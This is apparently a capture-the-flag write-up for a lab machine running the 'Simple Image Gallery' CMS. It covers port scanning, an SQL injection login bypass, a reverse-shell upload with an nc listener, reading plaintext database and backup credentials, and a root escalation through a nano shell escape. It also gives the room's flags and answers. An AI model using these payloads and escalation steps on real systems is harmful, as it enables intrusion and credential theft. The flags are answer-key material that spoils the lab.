# Gallery Writeup

> Machine : Linux

> Try to exploit our image gallery system

## Solution

First reconnaissance and port scanning.

```shell
nmap -sV -sC -Pn --open 10.129.137.90 -p-
```

```text
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 33:62:1a:95:fa:71:57:a0:64:93:19:b5:5c:f1:0f:b8 (RSA)
|   256 4a:80:c0:7d:00:14:94:04:0b:99:07:7b:89:a9:46:25 (ECDSA)
|_  256 90:f0:dc:a2:8d:ab:7a:00:95:3d:26:24:3f:f7:40:4d (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.41 (Ubuntu)
8080/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-title: Simple Image Gallery System
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

From our result, we can see ports 22 (SSH), 80 (HTTP) and 8080 (HTTP).

> How many ports are open?
> 
> 3

First let's run `gobuster` to find if there is hidden directories on the web.

```shell
gobuster dir -u 10.129.137.90 -w /usr/share/wordlists/dirb/common.txt
```

```text
gallery              (Status: 301) [Size: 316] [--> http://10.129.137.90/gallery/]
```

That's it. Now visiting `http://10.129.137.90/gallery/` we found a login page made by a `CMS` named `Simple Image Gallery System`.

> What's the name of the CMS?
> 
> Simple Image Gallery

While testing the login form, I attempted a classic SQL injection payload `admin' OR 1=1-- -`

And easily we gain access to admin page. Now The next plan is to upload a reverse shell.

First listening and create a reverse shell using `revshells`.

```shell
nc -lnvp 2222
```

Then on `http://10.129.137.90/gallery/?page=albums/images&id=1` we can upload the file we want.

And we are in.

```shell
whoami
```

```text
www-data
```

After gaining shell access let's search for sensitive configuration files on the service web.

```shell
cat /var/www/html/gallery/initialize.php
```

```text
if(!defined('DB_USERNAME')) define('DB_USERNAME',"gallery_user");
if(!defined('DB_PASSWORD')) define('DB_PASSWORD',"passw0rd321");
```

We found database credentials in plain text.

```shell
mysql -u gallery_user -p
passw0rd321
```

Now we have access to the database.

```text
MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| gallery_db         |
| information_schema |
+--------------------+
2 rows in set (0.000 sec)

MariaDB [(none)]> use gallery_db;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [gallery_db]> show tables;
+----------------------+
| Tables_in_gallery_db |
+----------------------+
| album_list           |
| images               |
| system_info          |
| users                |
+----------------------+
4 rows in set (0.000 sec)

MariaDB [gallery_db]> select * from users;
+----+--------------+----------+----------+----------------------------------+------------------------------+------------+------+---------------------+---------------------+
| id | firstname    | lastname | username | password                         | avatar                       | last_login | type | date_added          | date_updated        |
+----+--------------+----------+----------+----------------------------------+------------------------------+------------+------+---------------------+---------------------+
|  1 | Adminstrator | Admin    | admin    | a228b12a08b6527e7978cbe5d914531c | uploads/1789745100_shell.php | NULL       |    1 | 2021-01-20 14:02:37 | 2026-09-18 15:25:48 |
+----+--------------+----------+----------+----------------------------------+------------------------------+------------+------+---------------------+---------------------+
1 row in set (0.000 sec)
```

> What's the hash password of the admin user?
> 
> a228b12a08b6527e7978cbe5d914531c

As always we search if we can find something interesting in the backups files.

```shell
ls /var/backups/
```

```text
apt.extended_states.0     apt.extended_states.3.gz  apt.extended_states.6.gz
apt.extended_states.1.gz  apt.extended_states.4.gz  mike_home_backup
apt.extended_states.2.gz  apt.extended_states.5.gz
```

```shell
cat /var/backups/mike_home_backup
```

```text
cd ~
ls
ping 1.1.1.1
cat /home/mike/user.txt
cd /var/www/
ls
cd html
ls -al
cat index.html
sudo -lb3stpassw0rdbr0xx
clear
sudo -l
exit
```

We observe that when the `sudo -l` command was executed, the password `b3stpassw0rdbr0xx` was entered.

Now we have credentials for user `mike`.

```shell
ssh mike@10.129.137.90
b3stpassw0rdbr0xx
```

```shell
cat user.txt 
```

```text
THM{af05cd30bfed67849befd546ef}
```

> What's the user flag?
> 
> THM{af05cd30bfed67849befd546ef}

```shell
sudo -l
```

```text
Matching Defaults entries for mike on ip-10-129-137-90:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User mike may run the following commands on ip-10-129-137-90:
    (root) NOPASSWD: /bin/bash /opt/rootkit.sh
```

We can run `/opt/rootkit.sh` with sudo permeations.

```shell
cat /opt/rootkit.sh
```

```bash
#!/bin/bash

read -e -p "Would you like to versioncheck, update, list or read the report ? " ans;

# Execute your choice
case $ans in
    versioncheck)
        /usr/bin/rkhunter --versioncheck ;;
    update)
        /usr/bin/rkhunter --update;;
    list)
        /usr/bin/rkhunter --list;;
    read)
        /bin/nano /root/report.txt;;
    *)
        exit;;
esac
```

If we run the script and choose `read` we will get `nano` as root.

```shell
sudo /bin/bash /opt/rootkit.sh
Would you like to versioncheck, update, list or read the report ? read
```

```shell
^R^X
reset; bash 1>&0 2>&0
```

```shell
whoami
```

```text
root
```

```shell
cat /root/root.txt
```

```text
THM{ba87e0dfe5903adfa6b8b450ad7567bafde87}
```

> What's the root flag?
> 
> THM{ba87e0dfe5903adfa6b8b450ad7567bafde87}

